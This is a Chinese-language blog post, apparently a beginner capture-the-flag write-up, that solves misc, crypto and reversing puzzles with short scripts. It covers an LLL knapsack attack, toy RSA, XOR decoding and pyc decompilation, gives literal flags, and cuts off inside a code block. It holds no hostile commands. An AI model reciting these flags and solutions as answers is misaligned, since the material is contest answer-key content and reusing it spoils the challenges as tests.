<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>JUSTCTF 新生杯Write Up | Xingyu &#39;s Note</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noodp" />
<meta name="Description" content="About LoveIt Theme"><link rel="prev" href="/post/pytorch-/pytorch-/" /><link rel="canonical" href="/post/justctf-%E6%96%B0%E7%94%9F%E6%9D%AF-write-up/" />
<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff"><meta property="og:title" content="JUSTCTF 新生杯Write Up" />
<meta property="og:description" content="JUSTCTF 新生杯 Write Up [TOC]
Misc Easy SignIn 题目给出二维码，扫描二维码即可获得Flag
Can you see me ? 打开文档为空，全选发现隐藏东西，根据长度判断可能为二进制。
1 2 3 4 5 6 7 8 9 10 11 12  with open(&#34;can_you_see_me.txt&#34;) as f: str = f.readlines() k = &#39;&#39; for i in str: if len(i)==17: k&#43;=&#39;0&#39; elif len(i)==33: k&#43;=&#39;1&#39; #注意一个字符长度为32 print(k) print(len(k))   抽象带师 利用搜索引擎，搜索 emoji密码
https://emojicipher.com/zh-CN
PUZZLE 题目给出 240张图片 拼接
1  identify JUST_ZSZZ.jpg #查看图片尺寸 58 * 58   1  montage JUST*." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/post/justctf-%E6%96%B0%E7%94%9F%E6%9D%AF-write-up/" />
<meta property="article:published_time" content="2020-12-10T09:48:08+08:00" />
<meta property="article:modified_time" content="2020-12-10T09:48:08+08:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="JUSTCTF 新生杯Write Up"/>
<meta name="twitter:description" content="JUSTCTF 新生杯 Write Up [TOC]
Misc Easy SignIn 题目给出二维码，扫描二维码即可获得Flag
Can you see me ? 打开文档为空，全选发现隐藏东西，根据长度判断可能为二进制。
1 2 3 4 5 6 7 8 9 10 11 12  with open(&#34;can_you_see_me.txt&#34;) as f: str = f.readlines() k = &#39;&#39; for i in str: if len(i)==17: k&#43;=&#39;0&#39; elif len(i)==33: k&#43;=&#39;1&#39; #注意一个字符长度为32 print(k) print(len(k))   抽象带师 利用搜索引擎，搜索 emoji密码
https://emojicipher.com/zh-CN
PUZZLE 题目给出 240张图片 拼接
1  identify JUST_ZSZZ.jpg #查看图片尺寸 58 * 58   1  montage JUST*."/>
<script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "JUSTCTF 新生杯Write Up",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "\/post\/justctf-%E6%96%B0%E7%94%9F%E6%9D%AF-write-up\/"
        },"image": {
                "@type": "ImageObject",
                "url": "\/cover.png",
                "width":  800 ,
                "height":  600 
            },"genre": "post","keywords": "CTF","wordcount":  2677 ,
        "url": "\/post\/justctf-%E6%96%B0%E7%94%9F%E6%9D%AF-write-up\/","datePublished": "2020-12-10T09:48:08\u002b08:00","dateModified": "2020-12-10T09:48:08\u002b08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
                "@type": "Organization",
                "name": "xxxx",
                "logo": {
                "@type": "ImageObject",
                "url": "\/logo.png",
                "width":  127 ,
                "height":  40 
                }
            },"description": ""
    }
    </script><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/css/lib/animate/animate.min.css"></head>
    <body><script>
            window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
            window.isDark && document.body.classList.add('dark-theme');
        </script><div class="wrapper"><nav class="navbar">
    <div class="navbar-container">
        <div class="navbar-header animated bounceIn">
            <a href="/">Xingyu &#39;s Note</a>
        </div>
        <div class="navbar-menu"><a class="menu-item" href="/post" title="">Post</a><a class="menu-item" href="/tags" title="">Tags</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="https://hugo-loveit-zh.netlify.com" title="简体中文"><i class="fas fa-language fa-fw"></i></a><a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
        </div>
    </div>
</nav><nav class="navbar-mobile">
    <div class="navbar-container">
        <div class="navbar-header">
            <div class="navbar-header-title animated bounceIn">
                <a href="/">Xingyu &#39;s Note</a>
            </div>
            <div class="menu-toggle" id="menu-toggle">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="navbar-menu" id="mobile-menu"><a class="menu-item" href="/post" title="">Post</a><a class="menu-item" href="/tags" title="">Tags</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="https://hugo-loveit-zh.netlify.com" title="简体中文"></a><a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
        </div>
    </div>
</nav><main class="main">
                <div class="container"><div class="page single"><h1 class="post-title animated pulse faster">JUSTCTF 新生杯Write Up</h1><div class="post-content"><h1 id="justctf-新生杯-write-up">JUSTCTF 新生杯 Write Up</h1>
<p>[TOC]</p>
<a class="post-dummy-target" id="misc"></a><h2>Misc</h2>
<a class="post-dummy-target" id="easy-signin"></a><h3>Easy SignIn</h3>
<p>题目给出二维码，扫描二维码即可获得Flag</p>
<a class="post-dummy-target" id="can-you-see-me-"></a><h3>Can you see me ?</h3>
<p>打开文档为空，全选发现隐藏东西，根据长度判断可能为二进制。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;can_you_see_me.txt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="nb">str</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
<span class="n">k</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">==</span><span class="mi">17</span><span class="p">:</span>
        <span class="n">k</span><span class="o">+=</span><span class="s1">&#39;0&#39;</span>
    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">==</span><span class="mi">33</span><span class="p">:</span>
        <span class="n">k</span><span class="o">+=</span><span class="s1">&#39;1&#39;</span>
<span class="c1">#注意一个字符长度为32</span>
<span class="k">print</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="抽象带师"></a><h3>抽象带师</h3>
<p>利用搜索引擎，搜索 emoji密码</p>
<p><a href="https://emojicipher.com/zh-CN">https://emojicipher.com/zh-CN</a></p>
<a class="post-dummy-target" id="puzzle"></a><h3>PUZZLE</h3>
<p>题目给出 240张图片  拼接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"> identify JUST_ZSZZ.jpg  <span class="c1">#查看图片尺寸 58 * 58</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">montage JUST*.jpg -tile 20x12  -geometry +0+0 a.png <span class="c1">#合成图片</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">gaps --image<span class="o">=</span>a.png --size<span class="o">=</span><span class="m">58</span> --save  <span class="c1">#自动拼图</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="ctfers-冒险之旅"></a><h3>CTFER‘S 冒险之旅</h3>
<p>RMV存档通用修改器</p>
<p>JUST{rpgg@me_is_s0_fun}</p>
<p>开挂玩游戏</p>
<a class="post-dummy-target" id="抽象带带带师"></a><h3>抽象带带带师</h3>
<p>所有emoji网站：</p>
<blockquote>
<ol>
<li><a href="https://codemoji.miaotony.xyz/">https://codemoji.miaotony.xyz/</a></li>
<li>base 100 : <a href="http://www.atoolbox.net/Tool.php?Id=936">http://www.atoolbox.net/Tool.php?Id=936</a> (校园网打开不可描述)</li>
<li><a href="https://aghorler.github.io/emoji-aes/#decrypt">https://aghorler.github.io/emoji-aes/#decrypt</a>   aes</li>
<li><a href="https://emojicipher.com/">https://emojicipher.com/</a></li>
</ol>
</blockquote>
<p>key1: emojicipher</p>
<p>key2: base100 ， 一直没找到这个网站， 以为是 codemoji</p>
<p>接下来就顺其自然</p>
<a class="post-dummy-target" id="crypto"></a><h2>Crypto</h2>
<a class="post-dummy-target" id="crypto-sign-in"></a><h3>Crypto Sign In</h3>
<p>下载附件，yanwenzi.txt  百度搜索 颜文字解码</p>
<a class="post-dummy-target" id="so-easy"></a><h3>So easy</h3>
<p>下载附件，解压文件，在加密脚本里面看到flag，JUST里面逆序提交</p>
<a class="post-dummy-target" id="basic-and-advanced"></a><h3>Basic and advanced</h3>
<p>搜索 le chiffre indéchiffrable， 发现为维吉尼亚密码，经过尝试密钥为 crypto，</p>
<p>解密后发现 JUST 后 字符有问题， 用凯撒密码尝试， 出flag</p>
<a class="post-dummy-target" id="lll"></a><h3>LLL</h3>
<p>经过百度搜索 发现为 背包加密 <a href="https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic">https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic</a></p>
<p>下载 sage ，附上代码</p>
<p>执行的时候 sage xxx.py</p>
<p>最后将 十六进制转字符串</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">sage.all</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># open the public key and strip the spaces so we have a decent array</span>
<span class="n">fileKey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;easy_task/public.key&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
<span class="n">pubKey</span> <span class="o">=</span> <span class="n">fileKey</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;L&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;[]&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
<span class="n">nbit</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">pubKey</span><span class="p">)</span>
<span class="c1"># open the encoded message</span>
<span class="n">fileEnc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;easy_task/enc.enc&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="n">fileEnc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;L&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;start&#34;</span><span class="p">)</span>
<span class="c1"># create a large matrix of 0&#39;s (dimensions are public key length +1)</span>
<span class="n">A</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="n">nbit</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">nbit</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
<span class="c1"># fill in the identity matrix</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">nbit</span><span class="p">):</span>
    <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
<span class="c1"># replace the bottom row with your public key</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">nbit</span><span class="p">):</span>
    <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">nbit</span><span class="p">]</span> <span class="o">=</span> <span class="n">pubKey</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
<span class="c1"># last element is the encoded message</span>
<span class="n">A</span><span class="p">[</span><span class="n">nbit</span><span class="p">,</span> <span class="n">nbit</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="nb">int</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">A</span><span class="o">.</span><span class="n">LLL</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">nbit</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
    <span class="c1"># print solution</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">row</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">list</span><span class="p">()</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">M</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">m</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">m</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
        <span class="k">print</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
        <span class="n">M</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">M</span><span class="p">)</span>
        <span class="c1"># remove the last bit</span>
        <span class="n">M</span> <span class="o">=</span> <span class="n">M</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">M</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="mi">2</span><span class="p">))[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">print</span> <span class="p">(</span><span class="n">M</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="baby-rsa"></a><h3>Baby Rsa</h3>
<p>根据题目给出部分  yafu、离散</p>
<p>根据 $a^b modx=(amodx)^b modx$</p>
<p>得出  $x^2modn=y$  $x^3modn=z$</p>
<p>求GCD得出 N ， 通过http://factordb.com/ 分解得到 p、q</p>
<p>根据离散数对，得出最终解 U_RSA_G0od</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">sympy.ntheory</span> <span class="kn">import</span> <span class="n">discrete_log</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">549255654365864476196144</span>
<span class="n">x</span> <span class="o">=</span> <span class="mi">153618743392211321669273</span>
<span class="n">y</span> <span class="o">=</span> <span class="mi">294470439622467776032293</span>
<span class="n">z</span> <span class="o">=</span> <span class="mi">396326281365084844903098</span>


<span class="c1">#n = GCD(x**2-y, x**3-z)</span>
<span class="c1">#print(n)</span>
<span class="c1"># 550891582005727412022619</span>

<span class="c1">#p:  722402380069</span>
<span class="c1">#q:  762582733951</span>

<span class="n">n</span> <span class="o">=</span> <span class="mi">550891582005727412022619</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">722402380069</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">762582733951</span>

<span class="n">e</span><span class="o">=</span><span class="n">discrete_log</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
<span class="n">d</span><span class="o">=</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">powmod</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)))</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="big-gift"></a><h3>Big Gift</h3>
<p>读取n分钟 读取到 n 和 e ， 发现n非常大，e=65537, 即用其他方法求n</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">Crypto.PublicKey.RSA</span> <span class="kn">as</span> <span class="nn">RSA</span>
<span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="kn">import</span> <span class="nn">libnum</span>


<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.enc&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
   <span class="n">cipher</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">byteorder</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">iroot</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">e</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="n">m</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</code></pre></td></tr></table>
</div>
</div><p>参考博客：https://blog.csdn.net/pytandfa/article/details/78741339</p>
<p>​					https://blog.csdn.net/zippo1234/article/details/109287550#2_68</p>
<a class="post-dummy-target" id="drunk-laffey"></a><h3>Drunk laffey</h3>
<p>根据题意，94位01为摩斯密码，那么最主要的就是找到摩斯密码的间隔。</p>
<p>根据 hint，二进制转换为10进制，每位十进制加起来，正好等于94，附上转换代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">a</span><span class="o">=</span><span class="s1">&#39;101011101111010100101101011010110001101111111100010011001000110011001100110001101110000110001101101&#39;</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
<span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
    <span class="k">if</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span><span class="s1">&#39;1&#39;</span><span class="p">:</span>
        <span class="nb">str</span> <span class="o">+=</span><span class="s1">&#39;.&#39;</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">str</span> <span class="o">+=</span><span class="s1">&#39;-&#39;</span>
<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="re"></a><h2>Re</h2>
<a class="post-dummy-target" id="re-without-hand"></a><h3>Re Without Hand</h3>
<p>下载附件，用idaq打开，搜索字符串，即得到 flag</p>
<a class="post-dummy-target" id="pyc"></a><h3>pyc</h3>
<p>根据提示，uncompyle6库 反编译pyc文件，写python脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="s1">&#39;RMKLcwsGawmGyj}Glmj}G{l~}j999e&#39;</span><span class="p">:</span>
    <span class="n">c</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">^</span> <span class="mi">24</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="md5"></a><h3>md5</h3>
<p>得到 come_on.pyc   反编译pyc文件，写脚本如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#0x937b8b318c569000</span>
<span class="c1">#0xb9ed7cb8a2f0b800</span>
<span class="c1">#0xe29cc9171a49d80     加个0</span>
<span class="c1">#0xa99e9ee21f22d800</span>
<span class="n">md5s</span> <span class="o">=</span> <span class="p">[</span><span class="mi">10627240790634959347</span><span class="p">,</span> <span class="mi">13397501598946605822</span><span class="p">,</span> <span class="mi">1020571715625065903</span><span class="p">,</span> <span class="mi">12222381132752278743</span><span class="p">]</span>
<span class="n">hexx</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">md5s</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="n">hexx</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">hexx</span><span class="p">)</span>
<span class="c1"># JUST{you_are_right_}</span>
</code></pre></td></tr></table>
</div>
</div><a class="post-dummy-target" id="maze"></a><h3>maze</h3>
<p>ida反编译，shift+f12看到特殊字符串，猜测为 迷宫，根据主函数，每二十为一行，跑一遍</p>
<blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">I__</span><span class="o">********</span><span class="n">___</span><span class="o">******</span>
<span class="o">**</span><span class="n">_</span><span class="o">********</span><span class="n">_</span><span class="o">*</span><span class="n">_</span><span class="o">******</span>
<span class="o">**</span><span class="n">_</span><span class="o">********</span><span class="n">_</span><span class="o">*</span><span class="n">_</span><span class="o">******</span>
<span class="n">___</span><span class="o">********</span><span class="n">_</span><span class="o">*</span><span class="n">__</span><span class="o">*****</span>
<span class="n">_</span><span class="o">**********</span><span class="n">_</span><span class="o">**</span><span class="n">_</span><span class="o">*****</span>
<span class="n">________</span><span class="o">***</span><span class="n">_</span><span class="o">**</span><span class="n">___</span><span class="o">***</span>
<span class="o">*******</span><span class="n">_____</span><span class="o">****</span><span class="n">__</span><span class="o">**</span>
<span class="o">*****************</span><span class="n">E</span><span class="o">**</span>
</code></pre></td></tr></table>
</div>
</div></blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
